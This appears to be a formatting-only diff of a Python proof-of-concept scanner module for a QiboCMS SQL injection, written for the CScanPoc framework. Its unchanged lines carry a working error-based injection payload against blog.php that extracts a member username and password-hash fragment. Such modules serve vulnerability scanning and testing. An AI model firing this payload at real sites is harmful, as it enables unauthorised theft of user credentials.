@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'QiboCMS_0031' # 平台漏洞编号，留空
+    vuln_id = 'QiboCMS_0031'  # 平台漏洞编号，留空
     name = '齐博CMS 注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-08-17'  # 漏洞公布时间
     desc = '''
         /blog/template/space/file/listbbs.php
@@ -33,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-             
+
             payload = "/blog.php?id=1%20and%20extractvalue%281,concat%280x7e7e7e,%28select%20concat%28username,0x7c7c7c,SUBSTRING%28%28select%20md5%28c%29%20from%20qb_members%20limit%200,1%29,9,16%29%29from%20qb_members%20limit%200,1%29,0x7e7e7e%29%29"
             url = self.target + payload
             r = requests.get(url)
@@ -47,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
